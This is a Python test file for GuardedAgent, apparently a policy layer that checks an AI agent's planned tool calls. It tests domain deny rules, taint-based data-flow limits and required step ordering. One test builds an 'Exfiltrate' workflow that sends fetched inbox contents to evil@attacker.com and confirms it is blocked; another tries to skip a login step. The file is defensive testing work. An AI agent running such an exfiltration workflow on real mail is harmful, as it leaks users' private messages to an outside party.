"""Tests for GuardedAgent (no LLM required)."""

import pytest

from guardians.workflow import Workflow, WorkflowStep, ToolCallNode, SymRef
from guardians.errors import SecurityViolation
from guardians.adapters.agent import GuardedAgent, AgentResult


def _build_email_agent() -> GuardedAgent:
    agent = GuardedAgent("test_email")

    @agent.tool(taint_labels=["email_content"])
    def fetch_mail(folder: str = "inbox") -> list:
        return [{"from": "alice@company.com", "body": "hello"}]

    @agent.tool
    def summarize(emails: list) -> str:
        return "summary of emails"

    @agent.tool(sink_params=["to", "body"])
    def send_email(to: str, body: str) -> dict:
        return {"status": "sent"}

    agent.deny("send_email", "to", not_in_domain=["company.com"])
    agent.no_data_flow("fetch_mail", to="send_email.body", unless_through=["summarize"])

    return agent


# --- Tool registration ---

def test_tool_registration():
    agent = _build_email_agent()
    spec = agent._registry.get_spec("fetch_mail")
    assert spec is not None
    assert spec.source_labels == ["email_content"]


def test_tool_decorator_returns_function():
    agent = GuardedAgent("test")

    @agent.tool
    def my_func(x: str) -> str:
        return x

    assert my_func("hello") == "hello"


# --- Policy building ---

def test_policy_built_correctly():
    agent = _build_email_agent()
    policy = agent._build_policy()
    assert set(policy.allowed_tools) == {"fetch_mail", "summarize", "send_email"}
    assert len(policy.automata) > 0
    assert len(policy.taint_rules) > 0


# --- run_workflow (no LLM needed) ---

def test_run_workflow_passes():
    agent = _build_email_agent()
    wf = Workflow(
        goal="Summarize emails",
        steps=[
            WorkflowStep(label="Fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="Summarize", tool_call=ToolCallNode(
                tool_name="summarize", arguments={"emails": SymRef(ref="emails")},
                result_binding="summary")),
        ],
    )
    result = agent.run_workflow(wf)
    assert isinstance(result, AgentResult)
    assert result.env["summary"] == "summary of emails"
    assert len(result.trace) == 2


def test_run_workflow_rejects_violation():
    agent = _build_email_agent()
    wf = Workflow(
        goal="Exfiltrate",
        steps=[
            WorkflowStep(label="Fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="Send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "evil@attacker.com",
                           "body": SymRef(ref="emails")})),
        ],
    )
    with pytest.raises(SecurityViolation):
        agent.run_workflow(wf)


# --- run() without planner ---

def test_run_without_planner_raises():
    agent = _build_email_agent()
    with pytest.raises(RuntimeError, match="[Nn]o planner"):
        agent.run("Summarize my emails")


# --- deny / no_data_flow validation ---

def test_deny_unknown_tool_raises():
    agent = GuardedAgent("test")

    @agent.tool
    def my_tool(x: str) -> str:
        return x

    with pytest.raises(ValueError, match="Unknown tool"):
        agent.deny("nonexistent", "x", not_in=["a"])


def test_no_data_flow_bad_format_raises():
    agent = GuardedAgent("test")

    @agent.tool(taint_labels=["data"])
    def source() -> str:
        return "data"

    @agent.tool(sink_params=["data"])
    def sink(data: str) -> None:
        pass

    with pytest.raises(ValueError, match="tool.param"):
        agent.no_data_flow("source", to="sink_no_dot")


# --- require_before ---

def test_require_before():
    agent = GuardedAgent("test")

    @agent.tool
    def login() -> str:
        return "token"

    @agent.tool
    def action(token: str) -> str:
        return "done"

    agent.require_before("action", steps=["login"])

    # Workflow that calls action without login first should fail
    wf = Workflow(
        goal="Skip login",
        steps=[
            WorkflowStep(label="Act", tool_call=ToolCallNode(
                tool_name="action", arguments={"token": "fake"})),
        ],
    )
    with pytest.raises(SecurityViolation):
        agent.run_workflow(wf)

    # Workflow with login first should pass
    wf_ok = Workflow(
        goal="Proper flow",
        steps=[
            WorkflowStep(label="Login", tool_call=ToolCallNode(
                tool_name="login", arguments={}, result_binding="tok")),
            WorkflowStep(label="Act", tool_call=ToolCallNode(
                tool_name="action",
                arguments={"token": SymRef(ref="tok")})),
        ],
    )
    result = agent.run_workflow(wf_ok)
    assert result.env["tok"] == "token"
